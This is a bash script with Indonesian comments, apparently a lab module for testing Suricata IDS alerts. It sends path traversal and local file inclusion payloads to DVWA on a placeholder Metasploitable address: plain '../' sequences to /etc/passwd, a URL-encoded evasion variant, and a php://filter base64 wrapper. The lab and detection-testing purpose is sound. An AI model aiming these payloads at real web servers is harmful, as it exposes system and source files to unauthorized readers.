#!/bin/bash

# =================================================================
# MODUL 06: PATH TRAVERSAL (FILE INCLUSION)
# Strategi: 3 Level Depth (Basic, Encoding, Wrapper/Filter)
# Referensi: IDS Final Discuss (1).docx
# Target: DVWA (File Inclusion Page)
# =================================================================

# KONFIGURASI
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
# Masukkan PHPSESSID valid dari browser
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"
LOG_FILE="logs/trav_session_$(date +%F).log"

# URL Vulnerable di DVWA
BASE_URL="http://$TARGET_IP/dvwa/vulnerabilities/fi/?page="

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo "[+] [06_TRAV] Memulai Modul Path Traversal..."
echo "[+] Target Base URL: $BASE_URL"

# Cek Cookie
if [[ "$COOKIE" == *"ganti_dengan"* ]]; then
   echo -e "${RED}[!] WARNING: Cookie belum di-set! Script akan gagal login DVWA.${NC}"
   sleep 3
fi

# -----------------------------------------------------------------
# LEVEL 1: BASIC TRAVERSAL (Noisy)
# Tujuan: Menguji rule standar "../" (Dot Dot Slash).
# Payload: ../../../../../etc/passwd
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Basic Traversal (/etc/passwd)...${NC}"

# FIX: Menghapus spasi yang salah di 'PAYLOAD = ' menjadi 'PAYLOAD='
PAYLOAD="../../../../../etc/passwd"
FULL_URL="${BASE_URL}${PAYLOAD}"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Path]   : $PAYLOAD${NC}"
echo -e "${YELLOW}    [Full URL]       : $FULL_URL${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Mengakses file sensitif Linux menggunakan path relative${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl1.txt
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER /etc/passwd Access)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 2: ENCODED TRAVERSAL (Evasion)
# Tujuan: Menguji kemampuan decoding URI Suricata.
# Teknik: Mengganti "/" dengan "%2f" dan "." dengan "%2e".
# Payload: ..%2f..%2f..%2fetc%2fpasswd
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running URL Encoded Traversal...${NC}"

# Payload: ../../../../../etc/passwd tapi di-encode
PAYLOAD="..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
FULL_URL="${BASE_URL}${PAYLOAD}"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Encoded]: $PAYLOAD${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Bypass filter sederhana yang hanya mencari string '../'${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl2.txt
echo "    -> Selesai. (Harapan: Deteksi Evasion atau tetap terdeteksi sebagai LFI)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: PHP WRAPPER (LFI to RCE Preparation)
# Tujuan: Menguji deteksi protokol PHP (bukan cuma path file).
# Teknik: Menggunakan 'php://filter' untuk membaca source code.
# Payload: php://filter/convert.base64-encode/resource=index.php
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running PHP Filter Wrapper...${NC}"

# Payload PHP Wrapper untuk bypass path checking standar
PAYLOAD="php://filter/convert.base64-encode/resource=../../../../../etc/passwd"
FULL_URL="${BASE_URL}${PAYLOAD}"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Wrapper]: $PAYLOAD${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Menggunakan protokol php:// untuk membungkus file target${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl3.txt
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER PHP wrapper)"

echo "[+] [06_TRAV] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"